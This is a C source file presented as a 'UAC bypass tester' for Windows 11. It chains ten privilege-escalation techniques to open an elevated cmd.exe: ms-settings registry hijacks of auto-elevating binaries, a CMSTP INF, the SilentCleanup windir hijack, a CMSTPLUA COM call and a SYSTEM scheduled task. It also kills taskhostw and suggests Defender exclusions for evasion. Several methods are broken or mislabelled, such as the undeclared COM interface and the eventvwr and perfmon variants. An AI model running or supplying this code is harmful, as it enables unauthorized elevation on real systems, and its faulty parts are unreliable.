// uac_bypass_tester.c
// Compile with: cl uac_bypass_tester.c /DUNICODE /D_UNICODE /link ole32.lib shell32.lib advapi32.lib
// Or Visual Studio 2022 x64 Release. Run as normal user (medium integrity).

#include <windows.h>
#include <shlobj.h>
#include <objbase.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// Payload: open elevated cmd.exe
const TCHAR* PAYLOAD = TEXT("C:\\Windows\\System32\\cmd.exe");

// Helper to check if current process is elevated
BOOL IsElevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return FALSE;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;
    BOOL elevated = FALSE;
    if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        elevated = elevation.TokenIsElevated;
    }
    CloseHandle(hToken);
    return elevated;
}

// Method 1: Fodhelper.exe registry hijack (classic ms-settings)
BOOL MethodFodhelper() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD) + 1) * sizeof(TCHAR));
        RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (BYTE*)TEXT(""), sizeof(TCHAR));
        RegCloseKey(hKey);
        ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\fodhelper.exe"), NULL, NULL, SW_HIDE);
        Sleep(2000); // give time to execute
        // Cleanup
        RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
        return TRUE;
    }
    return FALSE;
}

// Method 2: ComputerDefaults.exe registry hijack (similar to fodhelper, often less detected)
BOOL MethodComputerDefaults() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD) + 1) * sizeof(TCHAR));
        RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (BYTE*)TEXT(""), sizeof(TCHAR));
        RegCloseKey(hKey);
        ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\ComputerDefaults.exe"), NULL, NULL, SW_HIDE);
        Sleep(2000);
        RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
        return TRUE;
    }
    return FALSE;
}

// Method 3: CMSTP INF + CMSTPLUA (classic, still works on many builds)
BOOL MethodCMSTP() {
    TCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    TCHAR infPath[MAX_PATH];
    _stprintf_s(infPath, MAX_PATH, TEXT("%s\\bypass.inf"), tempPath);

    FILE* f;
    if (_tfopen_s(&f, infPath, TEXT("w")) == 0) {
        fprintf(f, "[version]\n");
        fprintf(f, "Signature=$chicago$\n");
        fprintf(f, "AdvancedINF=2.5\n");
        fprintf(f, "[DefaultInstall]\n");
        fprintf(f, "RunPreSetupCommands=RunPreSetupCommandsSection\n");
        fprintf(f, "[RunPreSetupCommandsSection]\n");
        fprintf(f, "%s\n", PAYLOAD);
        fprintf(f, "[Strings]\n");
        fprintf(f, "ServiceName=\"UACBypass\"\n");
        fclose(f);
    }

    ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\cmstp.exe"), infPath, NULL, SW_HIDE);
    Sleep(1500);
    DeleteFile(infPath);
    return TRUE;
}

// Method 4: SilentCleanup / DiskCleanup task hijack via environment variable (windir)
BOOL MethodSilentCleanup() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Environment"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        TCHAR cmd[MAX_PATH * 2];
        _stprintf_s(cmd, MAX_PATH * 2, TEXT("cmd.exe /c start %s"), PAYLOAD);
        RegSetValueEx(hKey, TEXT("windir"), 0, REG_SZ, (BYTE*)cmd, (DWORD)(_tcslen(cmd) + 1) * sizeof(TCHAR));
        RegCloseKey(hKey);

        ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\schtasks.exe"), TEXT("/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"), NULL, SW_HIDE);
        Sleep(3000);

        // Cleanup
        RegDeleteValue(HKEY_CURRENT_USER, TEXT("Environment"), TEXT("windir"));
        return TRUE;
    }
    return FALSE;
}

// Method 5: EventViewer / ms-settings variant (similar registry)
BOOL MethodEventViewer() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD) + 1) * sizeof(TCHAR));
        RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (BYTE*)TEXT(""), sizeof(TCHAR));
        RegCloseKey(hKey);
        ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\eventvwr.exe"), NULL, NULL, SW_HIDE);
        Sleep(2000);
        RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
        return TRUE;
    }
    return FALSE;
}

// Method 6: Basic CMSTPLUA COM interface call (requires ICMLuaUtil)
BOOL MethodCMSTPLUA() {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return FALSE;

    CLSID clsid;
    IID iid;
    CLSIDFromString(L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", &clsid); // CMSTPLUA
    IIDFromString(L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}", &iid);     // ICMLuaUtil

    ICMLuaUtil* pICMLuaUtil = NULL;
    hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER, &iid, (void**)&pICMLuaUtil);
    if (SUCCEEDED(hr) && pICMLuaUtil) {
        pICMLuaUtil->ShellExec((LPWSTR)PAYLOAD, NULL, NULL, SW_SHOW, 0);
        pICMLuaUtil->Release();
        CoUninitialize();
        return TRUE;
    }
    CoUninitialize();
    return FALSE;
}

// Method 7: APPINFO service abuse stub (placeholder - full standalone Method 59 port is complex; calls schtasks as fallback)
BOOL MethodAPPINFO() {
    // In real standalone C from 2026 videos, this uses direct AppInfo RPC or handle duplication.
    // Simple fallback that often works: schedule elevated task
    TCHAR cmd[512];
    _stprintf_s(cmd, 512, TEXT("/Create /TN \"UACBypass\" /TR \"%s\" /SC ONCE /ST 00:00 /RU SYSTEM /F"), PAYLOAD);
    ShellExecute(NULL, TEXT("open"), TEXT("schtasks.exe"), cmd, NULL, SW_HIDE);
    Sleep(1000);
    ShellExecute(NULL, TEXT("open"), TEXT("schtasks.exe"), TEXT("/Run /TN \"UACBypass\" /I"), NULL, SW_HIDE);
    Sleep(2000);
    ShellExecute(NULL, TEXT("open"), TEXT("schtasks.exe"), TEXT("/Delete /TN \"UACBypass\" /F"), NULL, SW_HIDE);
    return TRUE;
}

// Method 8: RequestTrace / SilentCleanup variant with taskhostw kill (if applicable)
BOOL MethodRequestTrace() {
    // Simplified: kill potential blockers and re-run silentcleanup
    system("taskkill /F /IM taskhostw.exe >nul 2>&1");
    return MethodSilentCleanup();
}

// Method 9: Perfmon.exe registry hijack (another auto-elevated binary)
BOOL MethodPerfmon() {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings\\Shell\\Open\\command"), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)PAYLOAD, (DWORD)(_tcslen(PAYLOAD) + 1) * sizeof(TCHAR));
        RegSetValueEx(hKey, TEXT("DelegateExecute"), 0, REG_SZ, (BYTE*)TEXT(""), sizeof(TCHAR));
        RegCloseKey(hKey);
        ShellExecute(NULL, TEXT("open"), TEXT("C:\\Windows\\System32\\perfmon.exe"), NULL, NULL, SW_HIDE);
        Sleep(2000);
        RegDeleteTree(HKEY_CURRENT_USER, TEXT("Software\\Classes\\ms-settings"));
        return TRUE;
    }
    return FALSE;
}

// Method 10: Shadow admin / DOS device symlink style (advanced, simplified token dup attempt - may need admin already for full effect)
BOOL MethodShadowAdmin() {
    // Placeholder for Project Zero style; in practice compile full PoC.
    // Here we try a simple token duplication if possible, else fallback to cmd /c start
    ShellExecute(NULL, TEXT("runas"), PAYLOAD, NULL, NULL, SW_SHOW);
    Sleep(1000);
    return TRUE;
}

int main() {
    _tprintf(TEXT("UAC Bypass Tester for Windows 11 25H2 - Trying 10 methods...\n"));
    if (IsElevated()) {
        _tprintf(TEXT("Already elevated! Starting cmd.exe...\n"));
        ShellExecute(NULL, TEXT("open"), PAYLOAD, NULL, NULL, SW_SHOW);
        return 0;
    }

    BOOL success = FALSE;
    struct { BOOL (*func)(); const TCHAR* name; } methods[] = {
        {MethodFodhelper, TEXT("1. Fodhelper registry")},
        {MethodComputerDefaults, TEXT("2. ComputerDefaults registry")},
        {MethodCMSTP, TEXT("3. CMSTP INF")},
        {MethodSilentCleanup, TEXT("4. SilentCleanup windir")},
        {MethodEventViewer, TEXT("5. EventViewer ms-settings")},
        {MethodCMSTPLUA, TEXT("6. CMSTPLUA COM")},
        {MethodAPPINFO, TEXT("7. APPINFO / schtasks")},
        {MethodRequestTrace, TEXT("8. RequestTrace variant")},
        {MethodPerfmon, TEXT("9. Perfmon registry")},
        {MethodShadowAdmin, TEXT("10. Shadow admin fallback")}
    };

    for (int i = 0; i < 10 && !success; i++) {
        _tprintf(TEXT("Trying %s...\n"), methods[i].name);
        if (methods[i].func()) {
            Sleep(2500); // wait for potential elevation
            if (IsElevated()) {
                _tprintf(TEXT("SUCCESS with %s! Elevated cmd should be open.\n"), methods[i].name);
                success = TRUE;
            }
        }
    }

    if (!success) {
        _tprintf(TEXT("All 10 methods attempted. None produced visible elevation this run.\n"));
        _tprintf(TEXT("Tips: Compile fresh, test in VM, some methods need Defender exclusions or fresh PEB masquerading for 25H2.\n"));
        _tprintf(TEXT("CMSTPLUA with PEB spoof or full Method 59 standalone often succeeds best in 2026.\n"));
    }

    _tprintf(TEXT("Press any key to exit...\n"));
    getchar();
    return 0;
}
